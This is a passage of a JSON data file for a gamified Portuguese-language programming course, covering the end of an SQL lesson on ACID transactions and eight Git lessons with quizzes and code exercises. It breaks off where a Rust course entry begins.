        "content": "# 💎 Transações ACID e Controle de Integridade\n\nMissão final na Data Matrix! Quando lidamos com transações financeiras, atribuição de patentes ou sistemas vitais, não podemos permitir que uma queda de energia no datacenter deixe os dados em um estado pela metade ou inconsistente.\n\n> **💡 O que é ACID?**\n> As quatro propriedades fundamentais de um banco relacional robusto:\n> - **A (Atomicidade)**: \"Tudo ou Nada\". Se uma instrução falhar, todas são desfeitas.\n> - **C (Consistência)**: As regras e restrições do banco são rigorosamente respeitadas.\n> - **I (Isolamento)**: Transações concorrentes simultâneas não interferem uma na outra.\n> - **D (Durabilidade)**: Uma vez confirmada, a alteração nunca será perdida, mesmo com reinício do servidor.\n\n---\n\n### 🛡️ O Bloco Transacional na Prática\n\nTransferindo 100 créditos galácticos de uma conta para outra:\n\n```sql\nBEGIN TRANSACTION; -- Inicia o isolamento seguro\n\n-- 1. Debita da conta A\nUPDATE contas \nSET saldo = saldo - 100 \nWHERE id = 1 AND saldo >= 100;\n\n-- 2. Credita na conta B\nUPDATE contas \nSET saldo = saldo + 100 \nWHERE id = 2;\n\n-- Se ambos os passos deram certo:\nCOMMIT; -- Salva em definitivo no disco!\n\n-- Caso ocorra qualquer imprevisto ou falha:\n-- ROLLBACK; -- Reverte tudo como se nada tivesse acontecido!\n```\n\n---\n\n### 🔒 Bloqueios e Controle de Concorrência (`FOR UPDATE`)\n\nPara evitar que dois processos leiam o mesmo saldo ao mesmo tempo antes de alterá-lo:\n\n```sql\n-- Bloqueia a linha contra alterações concorrentes até o COMMIT da transação atual:\nSELECT saldo FROM contas WHERE id = 1 FOR UPDATE;\n```\n\n> **⚠️ Armadilha Comum:**\n> Deixar transações abertas por longos períodos esperando retorno de APIs externas. Uma transação aberta mantém bloqueios (*locks*) nas tabelas, podendo enfileirar centenas de outros usuários e congelar a aplicação!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Mantenha suas transações o mais curtas e rápidas possível: realize cálculos pesados antes de abrir a transação.\n- Conheça os níveis de isolamento (`Read Committed`, `Repeatable Read`, `Serializable`) para escolher o equilíbrio certo entre velocidade e rigor.\n\n> **🛡️ Regra de Ouro:**\n> Toda operação que envolve mais de uma alteração interdependente de dados deve residir dentro de uma transação explícita.",
        "codeExample": "BEGIN;\nINSERT INTO historico_acesso (usuario_id, ip) VALUES (42, '192.168.1.1');\nUPDATE usuarios SET ultimo_acesso = NOW() WHERE id = 42;\nCOMMIT;",
        "exercises": [
          {
            "type": "quiz",
            "question": "Na sigla ACID de bancos de dados relacionais, o que significa a letra A (Atomicidade)?",
            "options": [
              "Que as tabelas são armazenadas no nível de átomos magnéticos do disco rígido.",
              "Que todas as operações da transação são tratadas como uma única unidade indivisível: ou todas são concluídas com sucesso, ou nenhuma é aplicada.",
              "Que apenas uma consulta pode ser executada por hora.",
              "Que o banco rejeita dados numéricos não primos."
            ],
            "correctIndex": 1,
            "explanation": "Atomicidade garante que a transação seja executada por inteiro ou seja completamente cancelada com rollback em caso de qualquer falha."
          },
          {
            "type": "code",
            "instruction": "Escreva os comandos para abrir uma transação com BEGIN, executar \"DELETE FROM sessoes_expiradas;\" e confirmar com COMMIT.",
            "initialCode": "-- Escreva o bloco transacional aqui\n",
            "expectedKeywords": [
              "BEGIN;",
              "DELETE FROM sessoes_expiradas;",
              "COMMIT;"
            ],
            "hint": "Use: BEGIN;\nDELETE FROM sessoes_expiradas;\nCOMMIT;",
            "solution": "BEGIN;\nDELETE FROM sessoes_expiradas;\nCOMMIT;"
          }
        ]
      }
    ]
  },
  {
    "id": "git",
    "slug": "git",
    "name": "Git",
    "planetName": "Version Control Base",
    "description": "A máquina do tempo e a ferramenta colaborativa indispensável de todo time de software moderno.",
    "icon": "🔀",
    "color": "#F05032",
    "language": "bash",
    "level": "Iniciante",
    "totalXp": 520,
    "lessons": [
      {
        "id": "git-1",
        "title": "1. O Túnel do Tempo: Init, Add & Commit Semântico",
        "description": "Domine as 3 áreas do Git, versionamento seguro e boas práticas de mensagens de commit.",
        "duration": 14,
        "xpReward": 60,
        "language": "bash",
        "content": "# 🔀 O Túnel do Tempo: Git & Commits Semânticos\n\nBem-vindo à **Version Control Base**! Antes da criação do Git por Linus Torvalds em 2005, desenvolvedores faziam cópias manuais de pastas com nomes como `projeto_final_v2_agora_vai_final_mesmo.zip`.\n\nO **Git** é um sistema de controle de versão distribuído que funciona como uma máquina do tempo infalível para qualquer arquivo de código.\n\n---\n\n### 🗺️ As Três Áreas do Git\n\nO Git gerencia seus arquivos em três estados distintos:\n\n1. **Working Directory (Diretório de Trabalho):** Onde você edita, cria e apaga arquivos normalmente no seu editor de código.\n2. **Staging Area (Área de Preparação / Index):** Onde você seleciona com cirurgia quais alterações farão parte do próximo \"pacote de viagem\":\n   ```bash\n   git add index.html estilos.css\n   # Ou para adicionar tudo de uma vez:\n   git add .\n   ```\n3. **Repositório Local (Histórico Permanente):** Onde o \"snapshot\" (fotografia) permanente do projeto é registrado para sempre com um comentário explicativo:\n   ```bash\n   git commit -m \"feat: adicionar botão de ignição no cockpit\"\n   ```\n\n---\n\n### 📝 A Arte dos Commits Semânticos (Conventional Commits)\n\nNa indústria de alto padrão, não escrevemos mensagens vagas como *\"ajustes\"* ou *\"corrigindo bug\"*. Usamos prefixos padronizados:\n\n- **`feat:`** Uma nova funcionalidade para o usuário.\n- **`fix:`** Correção de um bug em produção.\n- **`docs:`** Alterações em documentações ou README.\n- **`style:`** Ajustes de formatação sem mudança de lógica.\n- **`refactor:`** Refatoração de código que não altera o comportamento.\n\n> **💡 Dica Pro:**\n> Use `git status` o tempo todo! Ele é o radar de bordo que mostra exatamente quais arquivos foram modificados, quais estão na Staging Area e quais ainda não foram rastreados.\n\n> **⚠️ Armadilha Comum:**\n> Esquecer de rodar `git add` antes do `git commit`. Fazer commit sem arquivos no staging resulta na mensagem `nothing added to commit but untracked files present`.",
        "codeExample": "# Sequência Padrão de Trabalho com Git\n# 1. Checar o estado dos arquivos\ngit status\n\n# 2. Adicionar arquivos modificados à Staging Area\ngit add .\n\n# 3. Criar o ponto de restauração com mensagem semântica\ngit commit -m \"feat: implementar autenticador quântico de tripulantes\"",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual comando Git é utilizado para mover as alterações do seu Working Directory para a Staging Area (preparação para o commit)?",
            "options": [
              "git push",
              "git add",
              "git commit",
              "git checkout"
            ],
            "correctIndex": 1,
            "explanation": "git add (ou git add .) envia as modificações selecionadas para a Staging Area, permitindo revisar exatamente o que será incluído no próximo commit."
          },
          {
            "type": "fillblank",
            "title": "Registrando a Nova Funcionalidade",
            "instruction": "Complete a sequência de comandos para adicionar todos os arquivos e realizar o commit.",
            "codeSnippet": "git {{comando_adicionar}} .\ngit {{comando_salvar}} -m \"feat: modulo de navegacao\"",
            "blanks": [
              {
                "id": "comando_adicionar",
                "placeholder": "comando de palco",
                "expectedValues": [
                  "add"
                ],
                "hint": "Comando de 3 letras que adiciona arquivos à Staging Area."
              },
              {
                "id": "comando_salvar",
                "placeholder": "comando de gravação",
                "expectedValues": [
                  "commit"
                ],
                "hint": "Comando que grava o snapshot permanente no repositório."
              }
            ],
            "explanation": "Perfeito! git add . seguido de git commit -m \"...\" é o fluxo fundamental diário de todo programador profissional."
          }
        ]
      },
      {
        "id": "git-2",
        "title": "2. Ramificações Espaciais: Branch, Merge & GitHub",
        "description": "Trabalhe em paralelo com branches isoladas e sincronize seu código com repositórios remotos.",
        "duration": 16,
        "xpReward": 65,
        "language": "bash",
        "content": "# 🌿 Ramificações Espaciais: Branch, Merge & GitHub\n\nEm uma equipe profissional com 10 engenheiros trabalhando no mesmo projeto, seria um desastre se todos salvassem código simultaneamente no mesmo arquivo principal.\n\nPara resolver isso, o Git possui o conceito mais poderoso da engenharia de software moderna: **Branches (Ramificações)**.\n\n---\n\n### 🌿 O que é uma Branch?\n\nUma **branch** é uma linha do tempo paralela e isolada. Você pode criar uma branch para testar uma ideia maluca sem nenhum risco de quebrar o sistema principal (`main`):\n\n```bash\n# Criar e alternar para uma nova branch em um único comando\ngit checkout -b feature/escudo-defesa\n# Ou no Git moderno:\ngit switch -c feature/escudo-defesa\n```\n\n---\n\n### 🔀 Integrando Linhas do Tempo com `merge`\n\nQuando sua funcionalidade estiver testada e aprovada, você retorna para a branch principal e faz a fusão:\n\n```bash\ngit checkout main\ngit merge feature/escudo-defesa\n```\n\n---\n\n### ☁️ Conectando com a Nuvem (GitHub / GitLab)\n\nPara enviar seus commits locais para a nuvem onde toda a equipe tem acesso:\n\n```bash\n# Adicionar o endereço do repositório remoto\ngit remote add origin https://github.com/usuario/projeto.git\n\n# Enviar os commits da branch main para o repositório origin\ngit push -u origin main\n```\n\n> **💡 Dica Pro:**\n> Sempre rode `git pull origin main` antes de começar a trabalhar em uma nova tarefa. Isso garante que você está com o código mais atualizado da equipe no seu computador local.\n\n> **⚠️ Armadilha Comum:**\n> Nunca envie credenciais, chaves de API ou arquivos `.env` para o GitHub! Use sempre o arquivo `.gitignore` para excluir dados sensíveis e a pasta `node_modules`.",
        "codeExample": "# Fluxo Completo de Feature em Equipe\ngit checkout -b feature/radar-antimateria\ngit add .\ngit commit -m \"feat: calibracao de sensores de radar\"\ngit push -u origin feature/radar-antimateria",
        "exercises": [
          {
            "type": "quiz",
            "question": "Por que boas práticas de engenharia de software proíbem desenvolvedores de programar e fazer commits diretamente na branch \"main\" de produção?",
            "options": [
              "Porque a branch main é apagada automaticamente todo domingo à noite.",
              "Porque criar branches isoladas permite testar, revisar em Pull Requests e validar o código sem colocar em risco a versão estável em produção.",
              "Porque o Git só permite um único desenvolvedor por branch main.",
              "Porque a branch main só aceita código escrito em linguagem Assembly."
            ],
            "correctIndex": 1,
            "explanation": "Trabalhar em branches de feature mantém a branch principal sempre estável e pronta para deploy, permitindo que a equipe revise o código através de Pull Requests."
          },
          {
            "type": "code",
            "instruction": "Escreva o comando Git para criar e alternar simultaneamente para uma nova branch chamada feature/painel-laser.",
            "initialCode": "# Digite o comando abaixo\n",
            "expectedKeywords": [
              "git checkout -b feature/painel-laser"
            ],
            "hint": "Use git checkout -b seguido do nome da branch feature/painel-laser.",
            "solution": "git checkout -b feature/painel-laser"
          }
        ]
      },
      {
        "id": "git-3",
        "title": "3. Desfazendo Alterações: Restore, Reset e Revert",
        "description": "Viaje pelas linhas temporais do Git e recupere arquivos com git restore, git reset e o seguro git revert.",
        "duration": 15,
        "xpReward": 65,
        "language": "bash",
        "content": "# ⏪ Desfazendo Alterações: Restore, Reset e Revert\n\nCentro de controle temporal na Version Control Base! Todo desenvolvedor comete erros, apaga arquivos sem querer ou cria commits acidentais. O Git possui mecanismos cirúrgicos para rebobinar o tempo.\n\n> **💡 O Trio de Resgate Temporal**\n> - **`git restore`**: Descarta alterações não commitadas na sua área de trabalho ou retira arquivos da staging area (`--staged`).\n> - **`git revert`**: Cria um **novo commit** que desfaz exatamente o que um commit anterior fez (seguro para branches públicas compartilhadas!).\n> - **`git reset`**: Move o ponteiro da branch no tempo para trás (ideal para arrumar histórico local privado).\n\n---\n\n### 🧹 Desfazendo Modificações Locais com `git restore`\n\n```bash\n# 1. Descartar alterações de um arquivo que NÃO foi adicionado com git add:\ngit restore painel.js\n\n# 2. Tirar um arquivo da Staging Area (o mesmo que tirar do git add):\ngit restore --staged painel.js\n```\n\n---\n\n### 🛡️ O Seguro `git revert` vs O Perigoso `git reset`\n\n```bash\n# Desfazendo com segurança (NÃO reescreve histórico público):\ngit revert abc1234\n# O Git cria um commit novo com a mensagem \"Revert 'abc1234'\"!\n\n# Resetando localmente:\ngit reset --soft HEAD~1   # Desfaz o último commit, mantendo os arquivos no staging!\ngit reset --hard HEAD~1   # PERIGO: Apaga o último commit e descarta todas as alterações nos arquivos!\n```\n\n> **⚠️ Armadilha Comum:**\n> Usar `git reset --hard` em branches compartilhadas (como `main`). Isso reescreve o histórico no servidor, destruindo o trabalho dos outros cadetes e gerando divergências catastróficas! Para branches públicas, use SEMPRE `git revert`.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Se você apagou algo sem querer com `git reset`, use o comando salva-vidas `git reflog` para encontrar o hash perdido antes do commit ser limpo pelo coletor de lixo.\n- Prefira `git reset --soft` em vez de `--hard`: ele preserva suas alterações intactas na staging area para você revisar.\n\n> **🛡️ Regra de Ouro:**\n> Nunca use comandos destrutivos (`--hard` ou `--force`) sem verificar antes com `git status`.",
        "codeExample": "# Sequência de recuperação segura\ngit status\ngit restore --staged index.html\ngit restore index.html",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual comando do Git deve ser utilizado para desfazer um commit que já foi enviado para um repositório remoto público compartilhado sem reescrever o histórico?",
            "options": [
              "git reset --hard HEAD~1",
              "git revert <hash-do-commit>",
              "git clean -fd",
              "git delete commit"
            ],
            "correctIndex": 1,
            "explanation": "git revert cria um novo commit inverso preservando a integridade cronológica do repositório compartilhado."
          },
          {
            "type": "code",
            "instruction": "Escreva o comando Git para descartar as modificações não adicionadas no arquivo \"app.js\" usando \"git restore\".",
            "initialCode": "# Digite o comando git aqui\n",
            "expectedKeywords": [
              "git restore app.js"
            ],
            "hint": "Use: git restore app.js",
            "solution": "git restore app.js"
          }
        ]
      },
      {
        "id": "git-4",
        "title": "4. Resolução de Conflitos de Fusão (Merge Conflicts)",
        "description": "Identifique marcadores de conflito (<<<<<<< HEAD) e resolva colisões de código em equipe com serenidade.",
        "duration": 16,
        "xpReward": 65,
        "language": "bash",
        "content": "# ⚔️ Resolução de Conflitos de Fusão (Merge Conflicts)\n\nAlerta de colisão temporal na Version Control Base! Um conflito de merge acontece quando dois desenvolvedores alteram a **mesma linha** de um mesmo arquivo em branches diferentes. O Git não sabe qual das versões deve prevalecer e pede a intervenção humana.\n\n> **💡 Conflitos são Normais!**\n> Não entre em pânico. Um conflito não significa que você quebrou o sistema; significa apenas que você e outro cadete trabalharam no mesmo trecho simultaneamente.\n\n---\n\n### 🔍 Decodificando os Marcadores de Conflito\n\nQuando ocorre o conflito, o Git insere delimitadores visuais diretamente no arquivo:\n\n```javascript\n<<<<<<< HEAD\n// O que está na sua branch ATUAL:\nconst statusReator = 'POTENCIA_MAXIMA_100';\n=======\n// O que está vindo da branch que você está FUNDINDO:\nconst statusReator = 'MODO_ECONOMICO_50';\n>>>>>>> feature/economia-energia\n```\n\n- **`<<<<<<< HEAD`**: Início do código da branch em que você está.\n- **`=======`**: Divisor que separa as duas versões conflitantes.\n- **`>>>>>>> nome-da-branch`**: Fim do trecho que está vindo da outra branch.\n\n---\n\n### 🛠️ O Protocolo de Resolução em 4 Passos\n\n```bash\n# 1. Abra o arquivo e decida qual código manter (ou mescle os dois)\n# 2. Apague todos os marcadores (<<<<<<<, =======, >>>>>>>)\n# 3. Adicione o arquivo resolvido à staging area:\ngit add arquivo-conflitante.js\n\n# 4. Finalize o commit de merge:\ngit commit -m \"fix(merge): resolve conflito no status do reator\"\n```\n\nSe as coisas ficarem muito confusas e você quiser abortar o merge e voltar ao estado original antes do conflito:\n```bash\ngit merge --abort\n```\n\n> **⚠️ Armadilha Comum:**\n> Fazer commit com os marcadores de conflito esquecidos dentro do arquivo! A aplicação quebrará imediatamente com erro de sintaxe. Revise com `git diff` antes de comitar.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Sincronize sua branch local com a `main` frequentemente (`git pull`) para resolver pequenos conflitos gradualmente antes de abrir grandes Pull Requests.\n- Utilize ferramentas visuais integradas no VS Code ou GitKraken para comparar lado a lado (*3-way merge*).\n\n> **🛡️ Regra de Ouro:**\n> Converse com o autor da outra alteração antes de apagar código que você não compreende totalmente.",
        "codeExample": "# Abortando um merge em caso de emergência\ngit merge --abort\n\n# Verificando quais arquivos continuam com conflito\ngit status",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual comando deve ser utilizado para cancelar imediatamente um processo de merge com conflitos e retornar o repositório ao estado anterior?",
            "options": [
              "git reset --safe",
              "git merge --abort",
              "git cancel",
              "git revert HEAD"
            ],
            "correctIndex": 1,
            "explanation": "git merge --abort interrompe o processo de merge e restaura o estado de trabalho anterior ao comando de fusão."
          },
          {
            "type": "code",
            "instruction": "Escreva o comando para adicionar o arquivo resolvido \"dados.js\" ao staging e concluir o commit de merge.",
            "initialCode": "# Adicione o arquivo dados.js ao staging\n",
            "expectedKeywords": [
              "git add dados.js"
            ],
            "hint": "Use: git add dados.js",
            "solution": "git add dados.js"
          }
        ]
      },
      {
        "id": "git-5",
        "title": "5. Git Stash: Salvando Trabalho em Progresso",
        "description": "Guarde modificações incompletas na gaveta secreta do Git com git stash, pop, list e drop.",
        "duration": 15,
        "xpReward": 65,
        "language": "bash",
        "content": "# 🗄️ Git Stash: Salvando Trabalho em Progresso\n\nManobras de emergência na Version Control Base! Você está no meio do desenvolvimento de uma nova funcionalidade quando o almirante exige uma correção de bug urgente em outra branch. Você não quer criar um \"commit pela metade\" nem quer perder suas linhas de código. A solução é o **Git Stash**.\n\n> **💡 O que é o Git Stash?**\n> O stash funciona como uma \"gaveta temporária\". Ele pega todas as modificações não commitadas da sua área de trabalho e as guarda com segurança em uma pilha, deixando seu diretório totalmente limpo.\n\n---\n\n### 📥 Guardando e Resgatando com `git stash`\n\n```bash\n# 1. Guarda tudo na gaveta com uma mensagem descritiva:\ngit stash save \"WIP: prototipo de motor de dobra\"\n\n# Agora seu repositório está limpo! Você pode trocar de branch:\ngit switch main\n# ... conserta o bug urgente, comita e volta ...\ngit switch feature/propulsao\n\n# 2. Resgata as alterações da gaveta e as reaplica:\ngit stash pop\n```\n\n- **`git stash pop`**: Aplica as alterações salvas e as remove da pilha do stash.\n- **`git stash apply`**: Aplica as alterações mas **mantém** a cópia salva no stash.\n\n---\n\n### 📋 Inspecionando a Pilha do Stash\n\n```bash\n# Listar todos os stashes guardados:\ngit stash list\n# stash@{0}: WIP: prototipo de motor de dobra\n# stash@{1}: WIP: ajuste de css\n\n# Limpar um stash antigo específico:\ngit stash drop stash@{1}\n\n# Limpar tudo:\ngit stash clear\n```\n\n> **⚠️ Armadilha Comum:**\n> Lembrar que arquivos novos recém-criados que nunca foram adicionados ao Git (*Untracked files*) são ignorados pelo stash comum! Para guardar arquivos untracked também, use a flag `-u`: `git stash -u`.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Coloque sempre mensagens claras nos seus stashes (`git stash push -m \"descrição\"`). Ter uma lista cheia de `WIP on main` torna impossível saber o que é cada coisa semanas depois!\n- Não use o stash como substituto de commits em branches de trabalho: o stash é para pausas temporárias de curta duração.\n\n> **🛡️ Regra de Ouro:**\n> O stash deve ser esvaziado com frequência para não se transformar em um cemitério de códigos esquecidos.",
        "codeExample": "# Fluxo completo de uso do stash\ngit stash -u -m \"tentativa de refatoração do gerador\"\ngit status\ngit stash pop",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual é a diferença entre \"git stash pop\" e \"git stash apply\"?",
            "options": [
              "git stash pop converte o stash em uma branch zipada.",
              "git stash pop reaplica as modificações e as remove da lista do stash, enquanto apply reaplica mantendo o item na lista.",
              "git stash apply só funciona em sistemas operacionais Unix.",
              "git stash pop apaga o histórico do Git permanentemente."
            ],
            "correctIndex": 1,
            "explanation": "pop retira o item da pilha do stash após aplicá-lo com sucesso, enquanto apply o preserva para reutilizações futuras."
          },
          {
            "type": "code",
            "instruction": "Escreva o comando para listar todos os stashes armazenados atualmente no seu repositório Git local.",
            "initialCode": "# Liste os stashes aqui\n",
            "expectedKeywords": [
              "git stash list"
            ],
            "hint": "Use: git stash list",
            "solution": "git stash list"
          }
        ]
      },
      {
        "id": "git-6",
        "title": "6. Git Rebase & Histórico Linear Limpo",
        "description": "Crie históricos elegantes e lineares sem poluição de commits de merge usando git rebase e interactive rebase.",
        "duration": 17,
        "xpReward": 65,
        "language": "bash",
        "content": "# 🧬 Git Rebase & Histórico Linear Limpo\n\nCirurgia temporal de alta precisão na Version Control Base! Em equipes de alta performance, manter um gráfico de histórico do Git limpo, linear e legível é essencial para auditorias e deploys contínuos.\n\n> **💡 O que é Git Rebase?**\n> Fazer um rebase significa mudar a \"base\" de partida da sua branch. Em vez de criar um \"commit de merge feio\" com duas pontas, o Git descola os seus commits da branch atual e os \"reaplica\" um por um no topo da branch de destino.\n\n---\n\n### 📐 Rebase na Prática\n\nSua branch `feature/escudos` começou a partir da `main`, mas a `main` já recebeu novos commits:\n\n```bash\n# Na sua branch de feature:\ngit switch feature/escudos\n\n# Aplica seus commits no topo da main mais recente:\ngit rebase main\n```\n\nO resultado é uma linha reta impecável, como se você tivesse começado a programar hoje a partir da versão mais recente da `main`!\n\n---\n\n### ✂️ Rebase Interativo (`git rebase -i`)\n\nUma ferramenta mágica para limpar seus commits antes de abrir um Pull Request (juntar commits pequenos com `squash`, renomear mensagens com `reword`):\n\n```bash\n# Abre o editor para os últimos 3 commits:\ngit rebase -i HEAD~3\n```\n\nComandos do editor interativo:\n- **`pick`**: Mantém o commit como está.\n- **`reword`**: Mantém o código, mas permite reescrever a mensagem do commit.\n- **`squash`**: Funde o commit com o commit anterior (ótimo para juntar commits do tipo \"ajuste de ponto e vírgula\").\n\n> **⚠️ A REGRA DE OURO DO REBASE:**\n> **NUNCA faça rebase de commits que já foram enviados para branches públicas compartilhadas!** O rebase gera novos hashes SHA-1 para os commits. Se outros cadetes já baixaram os hashes antigos, você causará o caos na equipe! Use rebase apenas na sua branch local privada.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Use `git pull --rebase origin main` para sincronizar sua branch com a remota sem gerar commits de merge desnecessários.\n- Se o rebase gerar conflitos repetidos difíceis de lidar, você pode abortar a qualquer momento com `git rebase --abort`.\n\n> **🛡️ Regra de Ouro:**\n> O histórico do Git é a biografia da sua base de código: mantenha-a legível, concisa e profissional.",
        "codeExample": "# Abortando um rebase com segurança\ngit rebase --abort\n\n# Continuando após resolver conflito de rebase\ngit add arquivo.js\ngit rebase --continue",
        "exercises": [
          {
            "type": "quiz",
            "question": "No rebase interativo (git rebase -i), qual comando é utilizado para fundir um commit com o commit imediatamente anterior a ele?",
            "options": [
              "drop",
              "squash (ou fixup)",
              "edit",
              "reword"
            ],
            "correctIndex": 1,
            "explanation": "O comando squash combina as alterações do commit selecionado no commit anterior, permitindo juntar múltiplos commits pequenos em um só."
          },
          {
            "type": "code",
            "instruction": "Escreva o comando para iniciar um rebase interativo dos últimos 4 commits.",
            "initialCode": "# Digite o comando de rebase interativo aqui\n",
            "expectedKeywords": [
              "git rebase -i HEAD~4"
            ],
            "hint": "Use: git rebase -i HEAD~4",
            "solution": "git rebase -i HEAD~4"
          }
        ]
      },
      {
        "id": "git-7",
        "title": "7. Pull Requests, Forks e Fluxo de Colaboração",
        "description": "Colabore em frotas estelares com Forks, Pull Requests, Code Reviews criteriosos e o padrão Git Flow.",
        "duration": 16,
        "xpReward": 65,
        "language": "bash",
        "content": "# 🤝 Pull Requests, Forks e Fluxo de Colaboração\n\nProtocolos de cooperação interestelar na Version Control Base! Ninguém constrói uma nave estelar sozinho. O fluxo de trabalho moderno em plataformas como GitHub e GitLab é centrado em **Pull Requests** e revisões de código.\n\n> **💡 O que é um Pull Request (PR)?**\n> Um Pull Request (ou *Merge Request*) é uma solicitação formal para que suas alterações em uma branch de trabalho sejam analisadas, testadas e fundidas na branch principal do projeto.\n\n---\n\n### 🔄 O Fluxo de Colaboração Profissional\n\n1. **Fork:** Cria uma cópia do repositório da frota na sua conta pessoal (essencial em projetos Open Source).\n2. **Clone & Branch:** Clona para a sua máquina e cria uma branch semântica:\n```bash\ngit switch -c feat/telemetria-reator\n```\n3. **Commit & Push:** Faz commits atômicos e envia para o seu repositório remoto:\n```bash\ngit push -u origin feat/telemetria-reator\n```\n4. **Abrir o Pull Request:** Descreva com clareza o que foi implementado, quais testes foram feitos e inclua prints se houver alterações visuais.\n5. **Code Review:** Seus colegas cadetes e líderes avaliam a arquitetura, apontam melhorias e sugerem correções.\n6. **Merge:** Uma vez aprovado e com os testes de CI/CD verdes, o código é integrado!\n\n---\n\n### 🛡️ Boas Práticas em Code Review\n\n- **Como autor:** Não envie PRs gigantescos com 3.000 linhas alteradas. Mantenha os PRs pequenos (menos de 400 linhas) e focados em um único objetivo.\n- **Como revisor:** Seja empático e construtivo. Elogie boas soluções, faça perguntas elucidativas e foque na qualidade da arquitetura e legibilidade do código.\n\n> **⚠️ Armadilha Comum:**\n> Fazer merge do PR com testes automatizados falhando ou ignorar os comentários dos revisores. O PR é uma ferramenta de garantia de qualidade e aprendizado mútuo da equipe.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Configure regras de proteção de branch (*Branch Protection Rules*) na `main` para exigir aprovação de pelo menos um revisor e testes de CI verdes antes do merge.\n- Use Conventional Commits (`feat:`, `fix:`, `docs:`, `test:`) nos títulos dos seus Pull Requests.\n\n> **🛡️ Regra de Ouro:**\n> O código só se torna patrimônio da frota após passar pelo crivo coletivo do Code Review.",
        "codeExample": "# Enviando a branch e configurando o upstream\ngit push -u origin feature/nova-interface",
        "exercises": [
          {
            "type": "quiz",
            "question": "Em termos de boas práticas de engenharia de software, qual é o tamanho ideal recomendado para um Pull Request?",
            "options": [
              "Conter pelo menos 5.000 linhas de código para justificar a reunião de equipe.",
              "Ser pequeno, atômico e focado em uma única responsabilidade (idealmente menos de 400 linhas), facilitando a revisão minuciosa.",
              "Juntar todas as tarefas do mês em um único envio acumulado.",
              "Não conter nenhuma descrição escrita de texto."
            ],
            "correctIndex": 1,
            "explanation": "PRs pequenos e atômicos recebem revisões mais detalhadas, são aprovados mais rápido e reduzem drasticamente o risco de bugs em produção."
          },
          {
            "type": "code",
            "instruction": "Escreva o comando para criar e mudar imediatamente para uma nova branch chamada \"feat/autenticacao\" usando \"git switch -c\".",
            "initialCode": "# Crie e mude para a branch aqui\n",
            "expectedKeywords": [
              "git switch -c feat/autenticacao"
            ],
            "hint": "Use: git switch -c feat/autenticacao",
            "solution": "git switch -c feat/autenticacao"
          }
        ]
      },
      {
        "id": "git-8",
        "title": "8. Tags de Versão e Releases Semânticas",
        "description": "Marque marcos históricos no repositório com git tag e adote o versionamento semântico (SemVer: MAJOR.MINOR.PATCH).",
        "duration": 16,
        "xpReward": 70,
        "language": "bash",
        "content": "# 🏷️ Tags de Versão e Releases Semânticas\n\nMissão final na Version Control Base! Quando um software atinge um marco estável para ir aos clientes ou bases estelares, não dizemos \"baixe o commit abc1234\". Criamos **Tags** e **Releases** com numeração oficial.\n\n> **💡 O que é uma Git Tag?**\n> Uma tag é um marcador estático apontando para um commit específico do histórico. Diferente de branches que se movem a cada novo commit, uma tag é imutável e permanente.\n\n---\n\n### 📦 Versionamento Semântico (SemVer: `vX.Y.Z`)\n\nO padrão internacional SemVer segue a estrutura: `MAJOR.MINOR.PATCH` (ex: `v2.4.1`):\n1. **MAJOR (2.x.x)**: Mudanças que quebram compatibilidade com versões anteriores (*Breaking Changes*).\n2. **MINOR (x.4.x)**: Novas funcionalidades adicionadas mantendo compatibilidade retroativa.\n3. **PATCH (x.x.1)**: Correções de bugs que mantêm total compatibilidade.\n\n---\n\n### 🏷️ Criando e Publicando Tags\n\nExistem tags leves (*lightweight*) e tags anotadas (*annotated*). Em produção, sempre usamos **tags anotadas** pois guardam autor, data e mensagem:\n\n```bash\n# 1. Criar uma tag anotada com mensagem:\ngit tag -a v1.0.0 -m \"Release Oficial: Lançamento da Estação Nexus\"\n\n# 2. Listar todas as tags do projeto:\ngit tag -l\n\n# 3. Ver detalhes da tag e o commit associado:\ngit show v1.0.0\n\n# 4. Enviar a tag para o GitHub/GitLab:\n# CUIDADO: git push comum NÃO envia tags! Você deve enviar explicitamente:\ngit push origin v1.0.0\n\n# Ou enviar todas as tags locais de uma vez:\ngit push origin --tags\n```\n\n> **⚠️ Armadilha Comum:**\n> Esquecer de dar `git push origin --tags`. Você cria a tag na sua máquina local, mas os pipelines de deploy automatizados no servidor nunca são disparados porque a tag não subiu!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Vincule a criação de tags à geração automática de Changelogs e pacotes de release em plataformas como GitHub Releases.\n- Nunca delete e recrie uma tag com o mesmo número após ela ter sido distribuída para clientes. Se houver erro, lance um novo PATCH (`v1.0.1`).\n\n> **🛡️ Regra de Ouro:**\n> Tags são marcos históricos congelados no tempo; trate cada release como um lançamento orbital definitivo.",
        "codeExample": "# Criando tag anotada de produção\ngit tag -a v2.0.0 -m \"feat(breaking): nova arquitetura quântica\"\ngit push origin v2.0.0",
        "exercises": [
          {
            "type": "quiz",
            "question": "De acordo com o Versionamento Semântico (SemVer 2.0.0), qual dígito da versão \"1.3.5\" deve ser incrementado quando lançamos uma correção de bug sem quebrar compatibilidade?",
            "options": [
              "O primeiro dígito (MAJOR)",
              "O segundo dígito (MINOR)",
              "O terceiro dígito (PATCH)",
              "Todos os dígitos simultaneamente"
            ],
            "correctIndex": 2,
            "explanation": "O segmento PATCH (o último dígito) é reservado para correções de bugs com compatibilidade retroativa."
          },
          {
            "type": "code",
            "instruction": "Escreva o comando Git para criar uma tag anotada chamada \"v1.0.0\" com a mensagem \"Versao Estavel\" usando os argumentos -a e -m.",
            "initialCode": "# Crie a tag anotada aqui\n",
            "expectedKeywords": [
              "git tag -a v1.0.0 -m \"Versao Estavel\""
            ],
            "hint": "Use: git tag -a v1.0.0 -m \"Versao Estavel\"",
            "solution": "git tag -a v1.0.0 -m \"Versao Estavel\""
          }
        ]
      }
    ]
  },
  {
    "id": "rust",
    "slug": "rust",
    "name": "Rust",
    "planetName": "Cidadela de Ferro",
    "description": "Concorrência sem medo, alta performance e controle de memória com o revolucionário Borrow Checker.",
    "icon": "🦀",
    "color": "#DEA584",
    "language": "rust",
